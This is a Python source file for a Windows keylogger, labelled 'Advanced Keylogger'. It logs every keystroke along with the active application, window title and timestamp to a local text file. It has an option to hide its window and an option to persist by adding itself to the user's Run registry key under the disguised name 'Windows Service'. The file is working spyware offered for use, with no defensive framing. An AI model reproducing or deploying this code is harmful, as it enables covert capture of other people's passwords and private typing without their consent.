from pynput.keyboard import Key,Listener
from win32gui import GetForegroundWindow as getapp,GetWindowText as getwintext
from win32gui import ShowWindow
from win32con import SW_HIDE
from win32process import GetWindowThreadProcessId as getid
from psutil import Process
from datetime import datetime
from win32api import RegOpenKeyEx,RegSetValueEx,RegCloseKey
from win32con import HKEY_CURRENT_USER,KEY_SET_VALUE,REG_SZ
with open("key_logs.txt","w+") as f:
    a="Advanced Keylogger"
    f.write(f"{a:#^60}\n")
lastappname=""
def format_key(key:str)->str:
     return f"\n{key.split(".")[1]}\n" if key.startswith("Key") else key
def key_log(key):
    global lastappname
    hwnd=getapp()
    wintext=getwintext(hwnd)
    _,pid=getid(hwnd)
    appname=Process(pid).name()+f"|{wintext}"
    time=datetime.now().strftime("%H:%M:%S")
    key=format_key(str(key))
    if lastappname==appname:
        logs=key
    else:
        logs=f"\nAppname: {appname}\tTime:{time}\n{key}"
        lastappname=appname
    with open("key_logs.txt","a")as f:
        f.write(logs)
def main(display="show",persistent="off"):
     """display=hide will run this logger as hidden
        persistence=on will make this keylogger as starts automatically when evertime user Logon 
     """
     if display=="hide":
        hwnd=getapp()
        ShowWindow(hwnd,SW_HIDE)
     if persistent=="on":
        key=RegOpenKeyEx(HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run",0,KEY_SET_VALUE)
        RegSetValueEx(key,"Windows Service",0,REG_SZ,__file__)
        RegCloseKey(key)
     with Listener(on_press=key_log) as listener:
          listener.join()

if __name__=="__main__":
   main()
